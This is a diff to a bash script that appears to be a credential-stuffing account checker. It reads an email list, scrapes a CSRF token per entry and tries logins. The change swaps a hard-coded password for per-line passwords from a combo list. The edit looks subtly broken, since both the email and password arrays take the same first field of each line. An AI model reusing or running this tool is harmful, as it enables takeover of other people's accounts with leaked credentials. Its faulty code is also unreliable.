@@ -66,13 +66,15 @@ read verif
 echo -n 'Do With Watching Movie? [y/n] '
 read wacing
 read -p 'Your Email List File: ' list
-y=$(cat $list)
+y=$(gawk -F: '{ print $1 }' $list)
+x=$(gawk -F: '{ print $1 }' $list)
+IFS=$'\r\n' GLOBIGNORE='*' command eval  'pwd=($x)'
 IFS=$'\r\n' GLOBIGNORE='*' command eval  'email=($y)'
 for (( i = 0; i < "${#email[@]}"; i++ )); do
 	decide_csrf=$(echo $(get_csrf) | grep -Po "(?<=name\=\"decide_csrf\" value\=\").*?(?=\" />)" | head -1)
 	emails="${email[$i]}"
 	printf "%-50s $emails\n"
-	pw='3xcr3w-ID123'
+	pw="${pwd[$i]}"
 	if [[ "$verif" = 'y' ]]; then
 		ceklogin=$(login $emails $pw $decide_csrf | grep -Po "(?<=\"message\":\").*?(?=\")")
 		gover=$(verif_data $decide_csrf)
